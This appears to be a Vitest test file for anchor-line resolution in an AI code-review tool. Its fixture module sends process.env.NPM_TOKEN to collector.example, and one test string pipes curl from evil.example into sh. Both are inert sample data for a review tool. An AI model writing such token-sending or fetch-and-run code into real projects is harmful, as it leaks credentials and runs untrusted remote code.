import { describe, expect, test } from "vitest";
import { anchorCandidates, resolveAnchorLine } from "../server/lib/ai-review/anchors";

const SOURCE = [
  "const https = require('https');",
  "",
  "function send(payload) {",
  "  const token = process.env.NPM_TOKEN;",
  "  return https.request('https://collector.example/ingest', payload, token);",
  "}",
  "",
  "module.exports = { send };",
].join("\n");

describe("resolveAnchorLine", () => {
  test("pins a verbatim line to its 1-based line number", () => {
    expect(resolveAnchorLine(SOURCE, "  const token = process.env.NPM_TOKEN;")).toBe(4);
  });

  test("ignores indentation, which diff rendering does not preserve", () => {
    expect(resolveAnchorLine(SOURCE, "const token = process.env.NPM_TOKEN;")).toBe(4);
  });

  test("strips a leading unified-diff marker copied out of the read tool", () => {
    expect(resolveAnchorLine(SOURCE, "+  const token = process.env.NPM_TOKEN;")).toBe(4);
  });

  test("prefers a literal match over the marker-stripped reading", () => {
    const text = ["  args.push('-force');", "  args.push('force');"].join("\n");
    expect(resolveAnchorLine(text, "-force');")).toBe(1);
  });

  test("matches a clipped anchor by containment", () => {
    expect(resolveAnchorLine(SOURCE, "https.request('https://collector.example")).toBe(5);
  });

  test("refuses an anchor that matches more than one line", () => {
    const text = ["value = 1;", "value = 1;"].join("\n");
    expect(resolveAnchorLine(text, "value = 1;")).toBeNull();
  });

  test("refuses an anchor with no identity of its own", () => {
    expect(resolveAnchorLine(SOURCE, "}")).toBeNull();
    expect(resolveAnchorLine(SOURCE, "   ")).toBeNull();
  });

  test("refuses a line the model never saw", () => {
    expect(resolveAnchorLine(SOURCE, "exec('curl evil.example | sh')")).toBeNull();
  });

  test("returns null for missing text or a missing anchor", () => {
    expect(resolveAnchorLine(null, "const https = require('https');")).toBeNull();
    expect(resolveAnchorLine(SOURCE, undefined)).toBeNull();
    expect(resolveAnchorLine("", "const https = require('https');")).toBeNull();
  });
});

describe("anchorCandidates", () => {
  test("offers the literal form first and the marker-stripped form second", () => {
    expect(anchorCandidates("-  rm -rf /tmp/cache")).toEqual([
      "-  rm -rf /tmp/cache",
      "rm -rf /tmp/cache",
    ]);
  });

  test("offers one form when there is no marker to strip", () => {
    expect(anchorCandidates("  const x = 1;")).toEqual(["const x = 1;"]);
  });

  test("drops forms below the signal floor", () => {
    expect(anchorCandidates("+ }")).toEqual([]);
    expect(anchorCandidates(null)).toEqual([]);
  });
});
